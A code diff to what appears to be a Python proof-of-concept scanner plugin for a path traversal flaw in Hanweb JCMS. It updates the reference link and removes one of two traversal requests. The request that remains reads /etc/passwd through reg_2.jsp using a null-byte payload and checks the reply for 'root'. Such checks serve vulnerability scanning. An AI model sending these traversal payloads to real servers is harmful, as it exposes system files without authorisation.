@@ -15,7 +15,7 @@ class Vuln(ABVuln):
         大汉科技（Hanweb）大汉JCMS，漏洞文件地址：
         /lm/front/reg_2.jsp?sysid=
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0116997'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'Hanweb(大汉)'  # 漏洞应用名称
@@ -49,13 +49,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
             # refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997
             hh = hackhttp.hackhttp()
             arg = self.target
-            url = arg + '/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
             url2 = arg + '/lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
-            code, head, res, errcode, _ = hh.http(url)
             code2, head2, res2, errcode2, _ = hh.http(url2)
 
             if code2 == 200 and re.search('root', res2):
